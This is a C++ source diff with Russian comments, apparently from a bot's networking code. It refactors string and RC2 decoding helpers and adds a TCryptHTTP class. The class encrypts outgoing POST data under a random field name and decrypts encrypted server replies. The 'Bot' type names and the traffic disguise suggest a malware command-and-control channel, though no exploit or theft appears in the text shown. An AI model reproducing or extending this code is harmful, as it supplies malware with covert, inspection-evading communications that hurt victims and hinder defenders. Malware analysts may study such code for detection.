@@ -18,7 +18,7 @@
 PCHAR PrepareHTTPBuffer(PCHAR Buf)
 {
 	// Функция отсекает лишние символы от зашифрованного буфера
-	if (STR::IsEmpty(Buf))
+	if (STRA::IsEmpty(Buf))
 		return NULL;
 
 	PCHAR S = Buf;
@@ -27,7 +27,7 @@ PCHAR PrepareHTTPBuffer(PCHAR Buf)
 //	while (*S != 0 && (*S == ' ' || *S == 10 || *S == 13)) S++;
 
 	// Отсекаем конечные символы
-	PCHAR E = STR::End(S);
+	PCHAR E = STRA::End(S);
 
 	while (E > S)
 	{
@@ -59,28 +59,26 @@ bool HTTPBufferContainsLineBreaks(PCHAR Buf)
 
 PCHAR DecodeHTTPBuffer(PCHAR InBuffer, PCHAR Password)
 {
-
 	// Функция декодирует зашифрованный текст, полученный в результате
 	// HTTP запроса. Нюанс в том, что некоторые скрипты могут возвращать
 	// текст не как один буфер а как несколько отдельно зашифрованных
 	// строк, разделённых переводами строки
 
 	PCHAR Buf = PrepareHTTPBuffer(InBuffer);
-	if (Buf == NULL)
-		return NULL;
+	if (STRA::IsEmpty(Buf)) return NULL;
+
 
 	// Если строка не содержит символов перевода то просто декодируем буфер
 	if (!HTTPBufferContainsLineBreaks(Buf))
 	{
-		RC2Crypt::DecodeStr(Password, Buf);
+		DWORD Size = 0;
+		RC2Crypt::DecodeStr(Password, Buf, Size);
 		return Buf;
     }
 
 
-
 	PStrings Source = Strings::Create();
     PStrings Dest   = Strings::Create();
-
 
 	// Раскладываем текст по строкам и декодируем каждую строку отдельно
 	Strings::SetText(Source, Buf);
@@ -92,7 +90,8 @@ PCHAR DecodeHTTPBuffer(PCHAR InBuffer, PCHAR Password)
 			continue;
 
 		// Декодируем строку
-		RC2Crypt::DecodeStr(Password, Str);
+		DWORD Size = 0;
+		RC2Crypt::DecodeStr(Password, Str, Size);
 		Strings::Add(Dest, Str);
 	}
 
@@ -103,7 +102,6 @@ PCHAR DecodeHTTPBuffer(PCHAR InBuffer, PCHAR Password)
 	Strings::Free(Dest);
 
 	return Result;
-
 }
 //---------------------------------------------------------------------------
 
@@ -158,3 +156,95 @@ bool CryptHTTP::Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHT
 
 	return Result;
 }
+
+
+
+//*****************************************************************************
+// 									TCryptHTTP
+//*****************************************************************************
+
+void TCryptHTTP::DoBeforePostData(TBotStream* PostData)
+{
+	// Зашифровываем отправляемые данные
+	if (!PostData || Password.IsEmpty() || Request.ContentType != FormDataURLEncoded)
+		return;
+
+	string Data = PostData->ReadToString();
+	if (Data.IsEmpty()) return;
+
+	PostData->SetSize(0);
+
+	PCHAR Name  = Random::RandomString(Random::Generate(3, 6), 'a', 'z');
+    PCHAR Value = RC2Crypt::Encode(Data.t_str(), Data.Length(), Password.t_str());
+
+	PCHAR EncodedValue = URLEncode(Value, STR::Length(Value));
+
+	PostData->Write(Name, STR::Length(Name));
+    PostData->Write("=", 1);
+	PostData->Write(EncodedValue, STR::Length(EncodedValue));
+	PostData->SetPosition(0);
+
+	STR::Free(Name);
+	STR::Free(Value);
+    STR::Free(EncodedValue);
+}
+//----------------------------------------------------------------
+
+void TCryptHTTP::DoDownloadCompleted(TBotStream* ResponseData)
+{
+	// Расшифровываем получнные данные
+	if (Password.IsEmpty()) return;
+
+	int Pos  = ResponseData->Position();
+	DWORD Size = ResponseData->Size() - Pos; // Для совместимости с шифроапи DWORD
+
+	if (Size == 0) return;
+
+	// Загружаем данные
+	TMemory Buf(Size + 1);
+
+	Size = ResponseData->Read(Buf.Buf(), Size);
+	*(Buf.AsStr() + Size) = 0;
+
+	// Обрезаем поток данных
+	ResponseData->SetSize(Pos);
+
+	// В зашифрованном буфере возможна ситуация когда
+	// данные будут зашифрованны блоками и разделены друг от
+	// друга символами  новой строки.
+	if (STRA::Scan(Buf.AsStr(), '\n') == NULL)
+	{
+		// Буфер сплошной, расшифровываем одним массивом
+		if (RC2Crypt::Decode(Password.t_str(), Buf.AsStr(), Size))
+		{
+			ResponseData->Write(Buf.Buf(), Size);
+		}
+	}
+	else
+	{
+		// Буфер является блочным
+		TBotStrings Source;
+
+		Source.SetText(Buf.AsStr());
+
+		// Декодируем все строки
+		int Count = Source.Count();
+		for (int i = 0; i < Count; i++)
+		{
+			string Line = Source[i];
+			if (Line.IsEmpty()) continue;
+
+			Size = Line.Length();
+			if (RC2Crypt::Decode(Password.t_str(),Line.t_str(), Size))
+			{
+				ResponseData->Write(Line.t_str(), Size);
+				if (i < Count)
+					ResponseData->Write(LineBreak, 2);
+            }
+		}
+	}
+
+	// Восстонавливаем исходную позицию
+	ResponseData->SetPosition(Pos);
+}
+//----------------------------------------------------------------
